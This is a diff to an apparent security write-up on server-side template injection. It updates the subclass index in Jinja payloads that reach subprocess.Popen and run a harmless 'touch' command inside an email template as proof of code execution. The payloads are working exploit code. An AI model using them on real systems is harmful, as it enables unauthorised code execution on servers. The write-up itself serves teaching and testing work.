@@ -324,7 +324,7 @@ This provides a pre-numbered list, making it easier to find the index number to 
 
 One of the classes that seems interesting is `subprocess.Popen`. The `subprocess` class allows us to "spawn new processes, connect to their input/output/error pipes, and obtain their return codes". This class is very useful when attempting to gain code execution.
 
-We can find the `subprocess` class on line `421` (your result might vary). Let's attempt to access index `420` (Python indexes start at `0`) and inspect the result by appending `"[420]"` to the payload.
+We can find the `subprocess` class on line `260` (your result might vary). Let's attempt to access index `258` (Python indexes start at `0`) and inspect the result by appending `"[258]"` to the payload.
 
 ```python
 {% set string = "ssti" %}
@@ -334,7 +334,7 @@ We can find the `subprocess` class on line `421` (your result might vary). Let's
 
 {% set mro_r = string|attr(class)|attr(mro) %}
 {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
-{{ subclasses_r[420] }}
+{{ subclasses_r[258] }}
 ```
 Rendering this function returns the `subprocess.Popen` class.
 
@@ -348,7 +348,7 @@ To do this, we craft a Server-Side Template Injection (SSTI) payload using `subc
 
 {% set mro_r = string|attr(class)|attr(mro) %}
 {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
-{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
+{{ subclasses_r[258](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
 ```
 This payload is inserted into an email template. When the template is rendered, it triggers code execution but returns only a `Popen` object—not output.
 
